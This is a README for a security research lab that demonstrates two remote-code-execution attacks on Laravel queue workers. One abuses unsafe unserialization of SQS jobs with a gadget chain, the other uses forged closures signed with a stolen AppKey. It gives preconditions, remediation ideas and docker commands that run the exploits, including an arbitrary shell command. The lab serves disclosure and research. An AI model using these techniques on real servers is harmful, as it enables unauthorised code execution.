# Laravel-Queue-Exploit-Environment

Under certain pre-conditions an attacker might be able to abuse the Laravel [Queues](https://laravel.com/docs/9.x/queues) system to execute arbitrary code within the context of the application server.

The preconditions are:

1. The victim Laravel app has a queue listener/worker active (so far I only confirmed this issue with the AWS SQS connector)
2. The attacker has access to the queue listener (For example leaked through the .env file)
3. (Optional) The attacker has knowledge of the AppKey

The exploits were both tested on Laravel 8 and Laravel 9.2.0.

## Exploitation notes

### Exploit through insecure unserialize call

This exploit client is integrated within the docker container `laravel-queue-exploit-environment-main_laravel_exploit_1` (see below).

Within this exploit an attacker pushes a malicious Queue object onto the SQS queue of the victim. Normally the queue object would contain a regular "job payload" or "command". However, the malicous Queue object contains a unserialize gadget chain as "command" object.

Laravel signs the "command" object with the AppKey. However, before the signature is checked, the attacker-controlled object is already unserialized, leading to the exploitation of the app server. This was tested in an out of the box Laravel config (only a queue listener needs to be started).

> The queue object itself is _not_ signed. The "job payload" is signed with the AppKey, but at this point the unsafe `unserialize` already happened. "Only" access to the queue services is needed.

The code snippet responsible for the unsafe `unserialize`:

`/vendor/laravel/framework/src/Illuminate/Queue/CallQueuedHandler.php (Line 95)`

In our exploit app we replace the "job payload" (`command`) with our own malicious unserialize gadget:

`./vendor/laravel/framework/src/Illuminate/Queue/Queue.php (Line 165)`

All code changes in the exploit app are commented with the string `Malicious Change` for easy grepping. Most changes were only hotfixes so we can lazily build our gadgetchain within Laravel.

The exploit entrypoint can be found within `./app/Console/Commands/exploitClosure.php`. As already mentioned we inject our payload at `./vendor/laravel/framework/src/Illuminate/Queue/Queue.php (Line 165)`.

#### Remmediation suggestions

Ideally, instead of only signing the `command` part of a job, the entire Queue object should be signed and validated with the AppKey. 

### Exploitation through unsafe "scope checks"

This exploit client is integrated within the docker container `laravel-queue-exploit-environment-main_laravel_exploit_scope_1` (see below).

This exploit works only if the attacker has knowledge of the victims' `AppKey` which allows them to sign malicious Queue Closure.

When processing a Queue Closure, Laravel checks for the `Scope` of the supplied object. This scope has no real validation and can be anything as long as it exists. (e.g. the always present class "EncryptCookies.php").

Due to this an attacker can execute arbitry Closures, as long as they are signed. This appears to be allowed by design.

(Sadly I can't find the code snippet right now which does check the scope (handles) the queue object)

A short explanation regarding the scope can be found within `./app/Console/Commands/exploitClosure.php`.

#### Remmediation suggestions

Maybe before the execution of a queue command there could be a scope check to ensure that the Scope points to an existing resource within the [app/Jobs](https://laravel.com/docs/9.x/queues#generating-job-classes) directory. 

Maybe there could also be an environment flag or filter which restricts the execution of arbitrary Closures.

## Test Environment Setup

We can start all docker containers with docker-compose.

Sadly I had to commit all files into the git repository.
This was due to the fact that I got unpredictable composer errors as some dependencies appeared to be missing.
Sometimes it worked, sometimes it didn't, sometimes it fixed itself...

Steps:

1. Prepare Docker

```bash
git clone git@github.com:mogwailabs/Laravel-Queue-Exploit-Environment.git
cd Laravel-Queue-Exploit-Environment

docker-compose up --build -d
```

Manually install aws sdk dependency (should not be needed):

```bash
docker exec -it laravel-queue-exploit-environment-main_laravel_exploit_1 composer require aws/aws-sdk-php
docker exec -it laravel-queue-exploit-environment-main_laravel_exploit_scope_1 composer require aws/aws-sdk-php
docker exec -it laravel-queue-exploit-environment-main_laravel_victim_1 composer require aws/aws-sdk-php
```
   
2. Prepare .env files

We need the following preconditions:

* All containers need to talk to the same AWS SQS Queue
* The victim container and the `laravel-queue-exploit-environment-main_laravel_exploit_scope_1` container need to have the _same_ AppKey

As this setup was the easiest for me I only tested this exploit with AWS SQS. 
I don't see a reason why other queues should not work, at will test those "later".

Example AWS SQS queue in .env:

(A more detailed setup example can be found [here](https://dev.to/ichtrojan/configuring-laravel-queues-with-aws-sqs-3f0n))

```ini
# Exploit queue connection
QUEUE_CONNECTION=sqs
AWS_ACCESS_KEY_ID=<ACCESS_KEY_ID>
AWS_SECRET_ACCESS_KEY=<ACCESS_SECRET>
AWS_DEFAULT_REGION=us-east-1
SQS_PREFIX=https://sqs.us-east-1.amazonaws.com/<SQS_QUEUE_ID>/
```

## Exploitation

The `victim` docker container is a default container with no modifications (besides the .env).

The victim will need to listen to the SQS queue, as it reads malicious Queue objects it will exploit itself.

```bash
# Run the SQS queue
docker exec -it laravel-queue-exploit-environment-main_laravel_victim_1  php artisan queue:listen sqs
```

The "normal" exploit client relies on an insecure unserialize call on the "command" object within the Queue object.

The object can be sent to the configured SQS queue with the following docker command:

```bash
docker exec -it laravel-queue-exploit-environment-main_laravel_exploit_1 php /app/artisan command:exploitClosureDeser
```

The "scope" exploit client can be called like the following:

```bash
docker exec -it laravel-queue-exploit-environment-main_laravel_exploit_scope_1 php /app/artisan command:exploitClosureWrongScope 'touch /tmp/pwnScope'
```

### Exploitation confirmation

```bash
# Make sure the victim has read all SQS queues
docker exec -it laravel-queue-exploit-environment-main_laravel_victim_1  php artisan queue:listen sqs

# Read the tmp file, there should be our two exploitation files
docker exec -it laravel-queue-exploit-environment-main_laravel_victim_1  ls /tmp/

# If these files don't exist, make sure the SQS queue is set correct on all the containers
# Also make sure that the "scope" container needs the same AppKey as the "victim"
# Also make sure the victim runs a Laravel version which is supported by this Gadgetchain https://github.com/ambionics/phpggc/blob/master/gadgetchains/Laravel/RCE/9/chain.php
```

